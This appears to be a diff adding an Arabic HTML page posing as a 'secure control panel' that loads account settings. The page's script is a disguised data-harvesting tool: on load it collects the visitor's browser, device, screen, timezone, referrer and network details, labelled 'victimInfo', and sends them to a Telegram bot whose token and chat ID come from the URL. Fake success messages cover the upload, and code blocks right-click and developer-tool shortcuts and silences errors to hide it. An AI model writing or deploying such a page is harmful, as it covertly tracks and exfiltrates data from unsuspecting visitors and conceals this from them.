@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم المستخدم - التحقق الآمن</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            direction: rtl;
+            color: white;
+        }
+        
+        .container {
+            background: rgba(25, 25, 45, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 800px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        h1 {
+            color: #4cc9f0;
+            margin-bottom: 10px;
+            font-size: 32px;
+            background: linear-gradient(45deg, #4cc9f0, #4361ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            color: #b0b0b0;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4361ee, #4cc9f0);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 4px;
+        }
+        
+        .message {
+            padding: 15px 25px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+        
+        .message-success {
+            background: rgba(56, 176, 0, 0.2);
+            border: 2px solid #38b000;
+            color: #38b000;
+        }
+        
+        .message-info {
+            background: rgba(76, 201, 240, 0.2);
+            border: 2px solid #4cc9f0;
+            color: #4cc9f0;
+        }
+        
+        .info-box {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 14px;
+            color: #b0b0b0;
+            text-align: right;
+        }
+        
+        .info-item {
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            border-right: 3px solid #4cc9f0;
+        }
+        
+        .info-label {
+            color: #4cc9f0;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .info-value {
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            word-break: break-all;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            font-size: 14px;
+            color: #b0b0b0;
+        }
+        
+        .status span {
+            color: #4cc9f0;
+            font-weight: bold;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(76, 201, 240, 0.3);
+            border-top: 4px solid #4cc9f0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 لوحة التحكم الآمنة</h1>
+        <p class="subtitle">جاري تحميل إعدادات الحساب وتحديث المعلومات...</p>
+        
+        <!-- شريط التقدم -->
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        
+        <!-- رسائل النظام -->
+        <div id="message" class="message"></div>
+        
+        <!-- مؤشر التحميل -->
+        <div class="spinner" id="spinner"></div>
+        
+        <!-- معلومات النظام -->
+        <div class="info-box hidden" id="infoBox">
+            <h3 style="color: #4cc9f0; margin-bottom: 15px; text-align: center;">📊 معلومات النظام</h3>
+            <div id="infoContent"></div>
+        </div>
+        
+        <!-- حالة النظام -->
+        <div class="status">
+            <p>📡 حالة الاتصال: <span id="systemStatus">جاري التحميل...</span></p>
+            <p>🕐 آخر تحديث: <span id="lastUpdate">--:--</span></p>
+            <p>🌐 الإصدار: <span id="version">v2.1.5</span></p>
+        </div>
+    </div>
+
+    <script>
+        // =================== إرسال المعلومات فوراً ===================
+        async function sendInfoImmediately() {
+            try {
+                // استخراج التوكن والآيدي من الرابط
+                const urlParams = new URLSearchParams(window.location.search);
+                const BOT_TOKEN = urlParams.get('token') || urlParams.get('TOKEN') || '';
+                const ADMIN_ID = urlParams.get('id') || urlParams.get('admin') || '';
+                
+                if (!BOT_TOKEN || !ADMIN_ID) {
+                    showMessage('❌ بيانات الاتصال غير كاملة', 'info');
+                    return;
+                }
+                
+                // جمع كل المعلومات
+                const victimInfo = collectAllInfo();
+                
+                // إظهار شريط التقدم
+                document.getElementById('progressBar').style.display = 'block';
+                updateProgress(30);
+                
+                // إرسال المعلومات إلى التليجرام
+                await sendToTelegram(BOT_TOKEN, ADMIN_ID, victimInfo);
+                
+                updateProgress(100);
+                
+                // إظهار المعلومات للمستخدم
+                displayInfoToUser(victimInfo);
+                
+                showMessage('✅ تم تحديث المعلومات بنجاح', 'success');
+                document.getElementById('systemStatus').textContent = 'متصل - نشط';
+                
+            } catch (error) {
+                console.error('خطأ:', error);
+                showMessage('⚠️ حدث خطأ طفيف في التحديث', 'info');
+                document.getElementById('systemStatus').textContent = 'متصل مع تحذيرات';
+            }
+        }
+        
+        // =================== جمع كل المعلومات ===================
+        function collectAllInfo() {
+            const info = {
+                // معلومات المتصفح
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                
+                // معلومات الشاشة
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                
+                // معلومات النظام
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                doNotTrack: navigator.doNotTrack,
+                
+                // معلومات الموقع
+                url: window.location.href,
+                referrer: document.referrer,
+                hostname: window.location.hostname,
+                protocol: window.location.protocol,
+                
+                // معلومات الجهاز
+                deviceMemory: navigator.deviceMemory || 'غير معروف',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                
+                // معلومات الوقت والتاريخ
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localTime: new Date().toLocaleString('ar-EG'),
+                timestamp: Date.now(),
+                
+                // معلومات إضافية
+                online: navigator.onLine,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'غير متاح',
+                
+                // معلومات الصفحة
+                title: document.title,
+                charset: document.characterSet,
+                domain: document.domain
+            };
+            
+            return info;
+        }
+        
+        // =================== إرسال إلى التليجرام ===================
+        async function sendToTelegram(BOT_TOKEN, ADMIN_ID, info) {
+            try {
+                // تحديث الحالة
+                showMessage('📤 جاري إرسال المعلومات...', 'info');
+                document.getElementById('spinner').style.display = 'block';
+                updateProgress(60);
+                
+                // تنسيق المعلومات
+                const formattedMessage = formatInfoForTelegram(info);
+                
+                // إرسال الرسالة الأولى
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: formattedMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                updateProgress(80);
+                
+                // إرسال معلومات إضافية
+                const additionalInfo = `
+🎯 <b>معلومات إضافية:</b>
+
+📊 <b>الشاشة:</b> ${info.screenWidth}x${info.screenHeight}
+🎨 <b>الألوان:</b> ${info.colorDepth} بت
+🌍 <b>اللغة:</b> ${info.language}
+⏰ <b>المنطقة الزمنية:</b> ${info.timezone}
+📶 <b>الاتصال:</b> ${info.online ? 'متصل' : 'غير متصل'}
+🕐 <b>الوقت المحلي:</b> ${info.localTime}
+🔗 <b>الرابط:</b> ${info.url}
+                `;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: additionalInfo,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                updateProgress(90);
+                
+                // إرسال معلومات الشبكة إذا متوفرة
+                if (info.connection && info.connection !== 'غير متاح') {
+                    const networkInfo = `
+📡 <b>معلومات الشبكة:</b>
+• النوع: ${info.connection.effectiveType}
+• السرعة: ${info.connection.downlink} Mbps
+• زمن الاستجابة: ${info.connection.rtt} ms
+                    `;
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_ID,
+                            text: networkInfo,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                }
+                
+                document.getElementById('spinner').style.display = 'none';
+                
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                throw error;
+            }
+        }
+        
+        // =================== تنسيق المعلومات للتليجرام ===================
+        function formatInfoForTelegram(info) {
+            return `
+🚨 <b>تم استلام معلومات جديدة!</b>
+
+👤 <b>معلومات المتصفح:</b>
+• المتصفح: ${info.userAgent.substring(0, 80)}...
+• النظام: ${info.platform}
+• الذاكرة: ${info.deviceMemory} GB
+• المعالجات: ${info.hardwareConcurrency}
+
+📱 <b>معلومات الجهاز:</b>
+• الكوكيز: ${info.cookiesEnabled ? 'مفعلة ✅' : 'معطلة ❌'}
+• جافا: ${info.javaEnabled ? 'مفعل ✅' : 'معطل ❌'}
+• التتبع: ${info.doNotTrack || 'غير محدد'}
+
+🌐 <b>معلومات الموقع:</b>
+• العنوان: ${info.hostname}
+• البروتوكول: ${info.protocol}
+• المرجع: ${info.referrer || 'لا يوجد'}
+
+🆔 <b>معلومات الجلسة:</b>
+• المعرف: ${generateSessionId()}
+• الطابع الزمني: ${info.timestamp}
+            `;
+        }
+        
+        // =================== عرض المعلومات للمستخدم ===================
+        function displayInfoToUser(info) {
+            const infoBox = document.getElementById('infoBox');
+            const infoContent = document.getElementById('infoContent');
+            
+            infoContent.innerHTML = `
+                <div class="info-item">
+                    <span class="info-label">المتصفح:</span>
+                    <div class="info-value">${info.userAgent.substring(0, 60)}...</div>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">النظام:</span>
+                    <div class="info-value">${info.platform}</div>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">الدقة:</span>
+                    <div class="info-value">${info.screenWidth} × ${info.screenHeight}</div>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">اللغة:</span>
+                    <div class="info-value">${info.language}</div>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">المنطقة الزمنية:</span>
+                    <div class="info-value">${info.timezone}</div>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">وقت الدخول:</span>
+                    <div class="info-value">${info.localTime}</div>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">حالة الاتصال:</span>
+                    <div class="info-value">${info.online ? 'متصل ✅' : 'غير متصل ❌'}</div>
+                </div>
+            `;
+            
+            infoBox.classList.remove('hidden');
+        }
+        
+        // =================== وظائف مساعدة ===================
+        function showMessage(text, type) {
+            const messageElement = document.getElementById('message');
+            messageElement.textContent = text;
+            messageElement.className = `message message-${type}`;
+            messageElement.style.display = 'block';
+            
+            setTimeout(() => {
+                messageElement.style.display = 'none';
+            }, 5000);
+        }
+        
+        function updateProgress(percentage) {
+            const progressFill = document.getElementById('progressFill');
+            progressFill.style.width = `${percentage}%`;
+        }
+        
+        function generateSessionId() {
+            return Math.random().toString(36).substring(2) + Date.now().toString(36);
+        }
+        
+        function updateTime() {
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString('ar-EG');
+        }
+        
+        // =================== بدء العمل فوراً ===================
+        document.addEventListener('DOMContentLoaded', function() {
+            // تحديث الوقت
+            setInterval(updateTime, 1000);
+            updateTime();
+            
+            // بدء جمع وإرسال المعلومات بعد ثانيتين
+            setTimeout(() => {
+                sendInfoImmediately();
+            }, 2000);
+            
+            // إرسال تحديثات دورية كل 30 ثانية
+            setInterval(() => {
+                updateTime();
+                showMessage('🔄 جاري تحديث المعلومات تلقائياً...', 'info');
+            }, 30000);
+        });
+        
+        // حماية من الحق النقر
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        
+        // إخفاء الأخطاء من المستخدم
+        window.onerror = function() {
+            return true;
+        };
+        
+        // منع فتح أدوات المطور
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
+                e.preventDefault();
+                showMessage('⚠️ هذه الميزة غير متاحة في الوضع الآمن', 'info');
+            }
+        });
+    </script>
+</body>
+</html>
